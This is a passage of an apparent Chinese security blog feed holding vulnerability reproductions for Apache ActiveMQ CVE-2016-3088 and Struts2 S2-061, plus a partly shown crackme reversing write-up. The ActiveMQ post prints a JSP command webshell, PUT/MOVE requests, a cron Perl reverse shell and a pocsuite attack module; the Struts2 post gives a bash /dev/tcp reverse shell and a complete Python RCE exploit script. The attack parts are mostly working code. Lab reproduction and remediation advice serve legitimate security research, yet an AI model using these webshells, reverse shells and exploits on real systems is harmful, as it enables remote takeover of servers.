class="line"></span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line&#x3D;null;</span><br><span class="line"> Process p&#x3D;Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line"> while((line&#x3D;br.readLine())!&#x3D;null)&#123;</span><br><span class="line">  out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151116478.png" alt="image-20201217151116478"></p><p>查看发现上传成功</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152139322.png" alt="image-20201217152139322"></p><p>由于上传的是文本文件并不能被服务器解析，所以我们下一步要利用MOVE方法将上传的webshell移动到可以执行的目录并更改后缀为jsp。</p><p>可以解析jsp文件的路径有：</p><p>1．/opt/activemq/webapps/api</p><p>2．/opt/activemq/webapps/admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;node016s6o5xkj6jyp130d905yk3j4l1.node0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>这里有一个坑，困惑了我很久，我的方法步骤都没有问题为什么MOVE方法会一直响应超时并且得不到任何响应的内容。尝试了很久，我一度怀疑我的</p><p>vulhub环境有问题，一次偶然中我用burp抓到的包去修改执行MOVE方法很快就得到了响应结果，神奇的是把这个数据包重新复制到repeater执行再次出现</p><p>响应超时的结果，明明是两个相同的数据包，真是令人费解，有的时候在正常渗透测试过程也会发现这个情况，根据xssle师傅分析可能是MOVE方法不稳定导致的</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152440918.png" alt="image-20201217152440918"></p><p>然后访问即可</p><p><a href="http://172.20.10.3:8161/api/1.jsp?cmd=ls">http://172.20.10.3:8161/api/1.jsp?cmd=ls</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152645064.png" alt="image-20201217152645064"></p><h3 id="2-计划任务反弹"><a href="#2-计划任务反弹" class="headerlink" title="2.计划任务反弹"></a>2.计划任务反弹</h3><p>写入反弹计划命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 250</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure><p>这里在命令后面注意把换行符修改为0a，也就是linux中的\n</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201223110657203.png" alt="image-20201223110657203"></p><p>移动到/etc/cron.d/目录下，遇到ubuntu目录不太一样，参考<a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/">这里</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153434585.png" alt="image-20201217153434585"></p><h3 id="3-写入ssh密钥"><a href="#3-写入ssh密钥" class="headerlink" title="3.写入ssh密钥"></a>3.写入ssh密钥</h3><p>docker未安装ssh未复现，可参考<a href="https://www.secpulse.com/archives/60064.html">这里</a></p><h3 id="Metasploit-反弹shell"><a href="#Metasploit-反弹shell" class="headerlink" title="Metasploit 反弹shell"></a>Metasploit 反弹shell</h3><p>进入metasploit，搜索2016-3088</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153915502.png" alt="image-20201217153915502"></p><p>直接淦就完事了</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154031247.png" alt="image-20201217154031247"></p><h2 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h2><p>根据漏洞的原理进行编写    验证模块PUT成功即可  攻击模块进行MOVE操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase,Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line"></span><br><span class="line">class ActiveMQPoc(POCBase):</span><br><span class="line">vulID &#x3D; &#39;002&#39;</span><br><span class="line">version &#x3D; &#39;1.0&#39;</span><br><span class="line">author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">vulDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">updateDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">references &#x3D; [&#39;https:&#x2F;&#x2F;paper.seebug.org&#x2F;346&#x2F;&#39;]</span><br><span class="line">name &#x3D; &#39;Apache ActiveMQ (CVE-2016-3088)&#39;</span><br><span class="line">appPowerLink &#x3D; &#39;activemq.apache.org&#39;</span><br><span class="line">appName &#x3D; &#39;Apache activemq&#39;</span><br><span class="line">appVersion &#x3D; &#39; Apache ActiveMQ 5.14.0&#39;</span><br><span class="line">vulType &#x3D; &#39;Arbitrary File Reading&#39;</span><br><span class="line">desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> fileserverfileserverjsp\</span><br><span class="line"> MOVEMOVE</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">samples &#x3D; []</span><br><span class="line">install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line">def _verify(self):</span><br><span class="line"> result &#x3D; &#123;&#125;</span><br><span class="line"> path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line"> path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;ls&quot;</span><br><span class="line"> url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line"> try:</span><br><span class="line"> resp &#x3D; req.put(url)</span><br><span class="line"> resp1 &#x3D; req.get(url)</span><br><span class="line"> if (resp.status_code &#x3D;&#x3D; 204 and str(resp1.status_code)[0] in (&#39;2&#39;, &#39;3&#39;)):</span><br><span class="line"> result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line"> result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line"></span><br><span class="line"> except Exception as ex:</span><br><span class="line"> pass</span><br><span class="line"></span><br><span class="line"> return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line"> output &#x3D; Output(self)</span><br><span class="line"> if result:</span><br><span class="line"> output.success(result)</span><br><span class="line"> else:</span><br><span class="line"> output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> return output</span><br><span class="line"></span><br><span class="line">def _attack(self):</span><br><span class="line">result &#x3D; &#123;&#125;</span><br><span class="line">path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line">path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;id&quot;</span><br><span class="line">url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line">url1 &#x3D; self.url + &#39;&#x2F;&#39; + path1</span><br><span class="line">data1 &#x3D; &#39;1&#39;</span><br><span class="line">data &#x3D; &#39;&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);String line&#x3D;null;Process p&#x3D;Runtime.getRuntime().exec(strcmd);BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));while((line&#x3D;br.readLine())!&#x3D;null)&#123;out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);&#125;%&gt;&#39;</span><br><span class="line"></span><br><span class="line">headers &#x3D;&#123;</span><br><span class="line"> &#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp&#39;</span><br><span class="line">&#125;</span><br><span class="line">headers1&#x3D;&#123;</span><br><span class="line">&#39;Authorization&#39;:&#39;Basic YWRtaW46YWRtaW4&#x3D;&#39;,</span><br><span class="line">&#39;Connection&#39;:&#39;close&#39;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">proxies&#x3D;&#123;</span><br><span class="line">&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">&#125;</span><br><span class="line">try:</span><br><span class="line">resp &#x3D; req.put(url,data&#x3D;data)</span><br><span class="line">resp1 &#x3D; req.get(url)</span><br><span class="line">resp2 &#x3D; req.request(&#39;MOVE&#39;,url&#x3D;url,headers&#x3D;&#123;&#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;2.jsp&#39;&#125;)</span><br><span class="line">resp3 &#x3D; req.get(url1,headers&#x3D;headers1)</span><br><span class="line">resp3 &#x3D; resp3.text[12:50]</span><br><span class="line">result[&#39;AdminInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">result[&#39;AdminInfo&#39;][&#39;SHELL&#39;] &#x3D; url1</span><br><span class="line">result[&#39;AdminInfo&#39;][&#39;EXEC &#39;] &#x3D; resp3</span><br><span class="line">except Exception as ex:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">register(ActiveMQPoc)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217173751874.png" alt="image-20201217173751874"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217214812586.png" alt="image-20201217214812586"></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p><p>2、通过移除 <code>conf\jetty.xml</code> 的以下配置来禁用 ActiveMQ Fileserver 功能</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/346/">https://paper.seebug.org/346/</a></p><p><a href="http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/">http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;影响版本：Apache ActiveMQ 5.0.0 – 5.13.2&lt;br&gt;ActiveMQ在5.12.x~5.13.x版
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ActiveMQ" scheme="http://www.ol4three.com/tags/ActiveMQ/"/>
    
  </entry>
  
  <entry>
    <title>Struts2 S2-061 远程命令执行漏洞(CVE-2020-17530)复现以及脚本编写</title>
    <link href="http://www.ol4three.com/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://www.ol4three.com/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-16T11:33:17.000Z</published>
    <updated>2020-12-23T08:50:51.640Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞，开发人员使用了 %{…} 语法，从而攻击者可以通过构Payload，从而造成远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts2：2.0.0 - 2.5.25</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;struts2&#x2F;s2-061</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╰─$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                   COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">e60ea5e361ff        vulhub&#x2F;struts2:2.5.25   &quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;mvn-…&quot;   34 minutes ago      Up 34 minutes       0.0.0.0:8080-&gt;8080&#x2F;tcp   s2-061_struts2_1</span><br></pre></td></tr></table></figure><h4 id="访问漏洞环境"><a href="#访问漏洞环境" class="headerlink" title="访问漏洞环境"></a>访问漏洞环境</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194045330.png" alt="image-20201216194045330"></p><h4 id="测试漏洞是否存在"><a href="#测试漏洞是否存在" class="headerlink" title="测试漏洞是否存在"></a>测试漏洞是否存在</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194318514.png" alt="image-20201216194318514"></p><h4 id="直接执行命令"><a href="#直接执行命令" class="headerlink" title="直接执行命令"></a>直接执行命令</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216201525731.png" alt="image-20201216201525731"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>通过在线地址将bash反弹命令进行进行编码转换</p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216210508614.png" alt="image-20201216210508614"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205907765.png" alt="image-20201216205907765"></p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;%25%7b(%27ol4three%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27&quot;</span>+cmd+<span class="string">&quot;%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d&quot;</span></span><br><span class="line">    tturl=url+<span class="string">&quot;/?id=&quot;</span>+payload</span><br><span class="line">    r=requests.get(tturl)</span><br><span class="line">    page=r.text</span><br><span class="line"><span class="comment">#   etree=html.etree</span></span><br><span class="line">    page=etree.HTML(page)</span><br><span class="line">    data = page.xpath(<span class="string">&#x27;//a[@id]/@id&#x27;</span>)</span><br><span class="line">    print(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ EXP: python struts2-061-poc.py http://1.1.1.1:8081 id      +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ VER: Struts 2.0.0-2.5.25                                   +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ S2-061 RCE &amp;&amp; CVE-2020-17530                               +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;[+]ussage: http://ip:port command&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[+]============================================================&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    url=sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">exp(url,cmd)</span><br></pre></td></tr></table></figure><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216203912346.png" alt="image-20201216203912346"></p><h4 id="Goby-poc-开发界面"><a href="#Goby-poc-开发界面" class="headerlink" title="Goby poc 开发界面"></a>Goby poc 开发界面</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216204623455.png" alt="image-20201216204623455"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205437353.png" alt="image-20201216205437353"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205455850.png" alt="image-20201216205455850"></p><h4 id="单个漏洞验证"><a href="#单个漏洞验证" class="headerlink" title="单个漏洞验证"></a>单个漏洞验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205525154.png" alt="image-20201216205525154"></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>将Apache Struts框架升级至最新版本</p><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-061">https://cwiki.apache.org/confluence/display/WW/S2-061</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew">https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://www.ol4three.com/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>crackme-系列之-crackme1</title>
    <link href="http://www.ol4three.com/2020/12/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme1/"/>
    <id>http://www.ol4three.com/2020/12/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme1/</id>
    <published>2020-12-15T13:12:02.000Z</published>
    <updated>2020-12-23T08:45:11.308Z</updated>
    
    <content type="html"><![CDATA[<h2 id="首先打开程序进行查看"><a href="#首先打开程序进行查看" class="headerlink" title="首先打开程序进行查看"></a>首先打开程序进行查看</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211408617.png" alt="image-20201217211408617" style="zoom:50%;"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211534773.png" alt="image-20201217211534773" style="zoom:50%;"><p>发现无壳</p><h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211703604.png" alt="image-20201217211703604" style="zoom:50%;"><p>账户密码认证 直接仍进去OD进行分析 搜索关键字</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211729398.png" alt="image-20201217211729398"></p><p>在函数⼊⼝处下断点然后运⾏跟踪</p><p>输⼊11111 11111</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211749736.png" alt="image-20201217211749736" style="zoom:50%;"><p>发现关键call 和对比进入分析</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211829649.png" alt="image-20201217211829649"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211843007.png" alt="image-20201217211843007"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211852605.png" alt="image-20201217211852605"></p><p>⽤户 11111</p><p>堆栈 ss:[0019F664]=0241D6A8, (ASCII “CW-4018-CRACKED”)</p><p>eax=00000005</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211930837.png" alt="image-20201217211930837" style="zoom:50%;"><p>输⼊后成功破解</p><h2 id="对算法进行相应的破解"><a href="#对算法进行相应的破解" class="headerlink" title="对算法进行相应的破解"></a>对算法进行相应的破解</h2><p>下断点 输⼊ 11111 22222</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212049762.png" alt="image-20201217212049762"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212101828.png" alt="image-20201217212101828"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212112333.png" alt="image-20201217212112333"></p><p>发现有两次-的拼接</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212144262.png" alt="image-20201217212144262"></p><p>CW-xxxx-CRACKED</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212206907.png" alt="image-20201217212206907"></p><p>这⾥为取第⼀⼀位 ascii码值的16进制 31 x 0x29</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212244191.png" alt="image-20201217212244191"></p><p>相乘之后为 0x7d9</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212316214.png" alt="image-20201217212316214"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212401486.png" alt="image-20201217212401486"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212426807.png" alt="image-20201217212426807"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212446924.png" alt="image-20201217212446924"></p><p>⾃身x2</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212513125.png" alt="image-20201217212513125"></p><p>之后转10进制即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212548980.png" alt="image-20201217212548980"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212606569.png" alt="image-20201217212606569"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212619373.png" 